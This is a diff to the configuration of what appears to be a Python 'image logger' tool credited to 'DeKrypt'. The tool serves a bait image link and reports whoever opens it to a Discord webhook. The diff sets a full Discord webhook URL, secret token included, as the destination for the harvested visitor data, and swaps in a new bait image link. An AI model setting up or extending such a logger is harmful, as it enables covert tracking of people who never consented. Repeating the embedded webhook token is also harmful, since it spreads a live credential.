@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/channels/1428497329811357748/1428497330860199967",
-    "image": "https://www.power.no/mobil-og-foto/mobiltelefon/apple-iphone-17-pro-256-gb-dypblaa/p-4157297/
+    "webhook": "https://discord.com/api/webhooks/1445848939394764922/dTt-gWg8Rav0aYy51o37sbFADU5xx6q1SNcQzr-HzwKDYpf5_1M3iFDx5knaJWWCIY6o",
+    "image": "https://digital-foto.no/fotografering/naturbilder/disse-5-dyrene-ma-du-fotografere",
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
